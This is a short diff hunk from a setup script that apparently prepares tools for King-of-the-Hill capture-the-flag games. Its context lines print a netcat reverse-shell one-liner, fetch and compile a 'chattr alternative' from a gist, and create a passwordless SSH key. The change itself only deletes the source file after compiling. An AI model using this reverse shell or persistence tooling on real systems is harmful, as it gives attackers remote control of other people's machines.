@@ -29,7 +29,7 @@ chmod +x get-static-binaries.sh
 echo "nc-rev: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $(hostname -i) 4444 >/tmp/f"
 
 echo "chattr alternative for koth (mf.c and mf)"
-wget -q https://gist.githubusercontent.com/ChrisPritchard/05d98e1d195bc255b30674c8ce0fec50/raw/d5f02539ff892b83d1079284553f052b316793a7/mf.c -O mf.c && gcc -static -o mf mf.c
+wget -q https://gist.githubusercontent.com/ChrisPritchard/05d98e1d195bc255b30674c8ce0fec50/raw/d5f02539ff892b83d1079284553f052b316793a7/mf.c -O mf.c && gcc -static -o mf mf.c && rm mf.c
 
 ssh-keygen -t ed25519 -P "" -f "/root/.ssh/id_ed25519" > /dev/null
 echo "ssh public key is:"
